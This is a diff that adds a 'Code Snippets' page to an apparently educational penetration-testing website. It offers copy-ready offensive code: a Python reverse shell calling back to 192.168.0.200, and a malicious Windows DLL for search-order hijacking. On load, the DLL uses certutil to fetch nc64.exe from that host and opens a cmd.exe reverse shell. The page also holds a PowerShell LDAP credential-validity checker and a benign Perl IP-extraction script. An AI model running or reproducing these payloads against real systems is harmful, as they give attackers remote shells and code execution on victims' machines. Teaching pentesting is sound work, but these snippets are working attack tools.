@@ -1,0 +1,223 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- Author:    Ezra Fast -->
+<!-- Date:      October 29, 2024 -->
+
+<!-- 
+Prism.js implementation based on: https://prismjs.com/#basic-usage
+    - the language of each <pre><code></code></pre> block is determined using class="language-xxxx"
+    - to highlight a new language, the prism.js JavaScript and CSS must be re-downloaded from https://prismjs.com/ with the correct language selection
+    - the current installation supports python, powershell, bash, ruby, perl, HTML, C++, C, CSS, and Javascript
+-->
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+    <meta name="description" content="The Code Snippets Page"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>          <!-- this is the line that makes appearance depend on the width of the user's device --> 
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>             <!-- this line sets the encoding system for the page -->
+    <title>Code Snippets</title>
+
+    <link href="scripts/prism/prism.css" rel="stylesheet" />
+
+    <link rel="stylesheet" type="text/css" href="./css/sheet.css" />
+
+</head>
+
+
+<!-- loading a script on page load: https://www.geeksforgeeks.org/how-to-run-a-function-when-the-page-is-loaded-in-javascript/ -->
+<body onload="populateLeftMenu()">
+    <div id="container" name="container" class="container">
+
+<!-- this is the title of the page and sub-heading -->
+        <div class="flexbox-2">
+            <div class="page-title" id="code-snippets-title">
+                <h1>Code Snippets</h1>
+                <h3>
+                    <i>Applying Techniques with Code</i>
+                </h3>
+            </div>
+
+            <!-- this is the main index of the page -->
+
+            <div class="main-index" id="extra-column-id">
+        
+                    <div id="code-snippet-div-housing">
+
+                        <div id="snippet-1" class="code-snippet-div">
+                            <h2>reverseShell.py</h2>
+                            <p><i>A basic reverse shell in python3 that leverages the socket, os, and pty modules.</i></p>
+                            <button type="button" class="view-code">View Full Code</button>
+                            <button type="button" class="copy-code">Copy code to clipboard</button>
+                            <div class="code-preview">
+                                <pre class="language-python">
+                                    <code>
+# a basic python script to connect back to the attacker with a bash shell
+# credit goes to: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+import socket
+import os
+import pty
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect(("192.168.0.200", 443))
+
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+pty.spawn("/bin/bash")
+                                    </code>
+                                </pre>
+                            </div>
+                            <img src="./images/python-rev-shell.png" alt="Alt: Python reverse shell being caught with netcat." class="code-image"/>
+                        </div>
+                        <div id="snippet-2" class="code-snippet-div">
+                            <h2>CheckDomainCredentials.ps1</h2>
+                            <p><i>Using Powershell to perform LDAP queries with a username:password combination to see if it is valid.</i></p>
+                            <button type="button" class="view-code">View Full Code</button>
+                            <button type="button" class="copy-code">Copy code to clipboard</button>
+                            <div class="code-preview">
+                                <pre class="language-powershell">
+                                    <code>
+# this script checks if a username/password combo is valid by performing LDAP queries on behalf of another user
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "&lt;username>", "&lt;password>")
+                                    </code>
+                                </pre>
+                            </div>
+                            <img src="./images/powershell-script.png" alt="Alt: Powershell LDAP authentication script" class="code-image"/>
+                        </div>
+                        <div id="snippet-3" class="code-snippet-div">
+                            <h2>MaliciousDLL.c</h2>
+                            <p><i>This C language shared library can be compiled and deployed to exploit the DLL search order.</i></p>
+                            <button type="button" class="view-code">View Full Code</button>
+                            <button type="button" class="copy-code">Copy code to clipboard</button>
+                            <div class="code-preview">
+                                <pre class="language-clike">
+                                    <code>
+// This is a malicious DLL that can be used to execute arbitrary commands on the local system
+// If you are replacing a missing DLL in a writable directory, this dll must have the same name as the missing library!
+
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include &lt;windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("certutil -urlcache -f http://192.168.0.200:8082/nc64.exe C:\\Temp\\nc64.exe");		// Make sure that these addreses/paths are correct
+        system("C:\\Temp\\nc64.exe -e cmd.exe 192.168.0.200 4445");            			// This is the line that executes the malicious command(s)
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+                                    </code>
+                                </pre>
+                            </div>
+                            <img src="./images/Shared-Library-C.png" alt="Alt: C language DLL source code" class="code-image"/>
+                        </div>
+                        <div id="snippet-4" class="code-snippet-div">
+                            <h2>all_ips.pl</h2>
+                            <p><i>Using regex in perl to find all the IP addresses in a piece of malware.</i></p>
+                            <button type="button" class="view-code">View Full Code</button>
+                            <button type="button" class="copy-code">Copy code to clipboard</button>
+                            <div class="code-preview">
+                                <pre class="language-perl">
+                                    <code>
+#!/usr/bin/perl -l
+
+# this perl script takes a file as argument 1 and uses a regular expression to locate and 
+# print all the IPv4 addresses contained therein.
+# usage: ./all_ips.txt file.type
+
+sub find_ip_addresses {
+
+    print "Searching $_[0] for IPv4 addresses...";
+
+    open(my $file, '&lt;', $_[0]) or die "Could not open the file: $!";               # $file is argv[1]
+
+    my $contents = do { local $/; &lt;$file> };
+
+    close($file);
+
+    my @ip_addresses = $contents =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
+
+    # print join("\n", map { "[+] $_" } @ip_addresses) . "\n";                      # nicer formatting
+    print join("\n", @ip_addresses);
+
+}
+
+find_ip_addresses($ARGV[0]);
+                                    </code>
+                                </pre>
+                            </div>
+                            <img src="./images/all-ips-pl.png" alt="Alt: IP address regex in perl5" class="code-image"/>
+                        </div>
+                    </div>
+                </div>
+                
+        </div>              <!-- this is the end of flexbox-2 -->
+
+<!-- this is the left menu -->
+
+        <div class="flexbox-1">
+            <div class="left-menu">
+                <h2 class="left-menu-title">Website.com</h2>
+                <p class="left-menu-title" id="left-menu-sub-heading">
+                    <strong>Technical Information Security</strong>
+                </p>
+
+                <table class="user-information-table" id="user-information-table">
+                    <tr>
+                        <td><p><strong>Your location: </strong></p></td>
+                        <td><p id="user-location"></p></td>
+                    </tr>
+                    <tr>
+                        <td><p><strong>Browser type: </strong></p></td>
+                        <td><p id="user-browser"></p></td>
+                    </tr>
+                    <tr>
+                        <td><p><strong>Your ISP: </strong></p></td>
+                        <td><p id="user-isp"></p></td>
+                    </tr>
+                  </table>
+
+                <div id="other-main-page-list">
+                    <ol type="i">
+                        <li><a href="./index.html">Home Page</a></li>
+                        <li><a href="./pentesting-phases.html">Pentesting by Phase</a></li>
+                        <li><a href="./information-gathering.html">Information Gathering</a></li>
+                        <li><a href="./vulnerability-discovery.html">Vulnerability Discovery</a></li>
+                        <li><a href="./initial-access.html">Initial Access</a></li>
+                        <li><a href="./privilege-escalation.html">Privilege Escalation</a></li>
+                        <li><a href="./post-exploitation.html">Post Exploitation</a></li>
+                        <li><a href="./pentesting-resources.html">Pentesting Resources</a></li>
+                        <li><a href="./glossary-definitions.html">Glossary &amp; Definitions</a></li>
+                        <li><a href="./code-snippets.html">Code Snippets</a></li>
+                        <li><a href="./log-processing.html">Log Processing</a></li>                 <!-- this was added during Unit 5 programming -->
+                        <li><a href="./breached-password-detector.html">Password Breach Checker</a></li>
+                    </ol>
+                </div>
+                <div id="legal-disclaimer">
+                    <a href="./legal-disclaimer.html">Legal Disclaimer</a>
+                </div>
+            </div>
+
+        </div>                  <!-- this is the end of the left-menu div -->
+
+    </div>              <!-- this is the end of the container div -->
+    <script src="scripts/left-menu.js"></script>
+    <script src="scripts/jquery.js"></script>
+    <script src="scripts/hide-left-menu.js"></script>
+    <script src="scripts/code-copy-button.js"></script>
+    <script src="scripts/code-snippet-previews.js"></script>
+    <script src="scripts/prism/prism.js"></script>
+</body>
+</html>
+
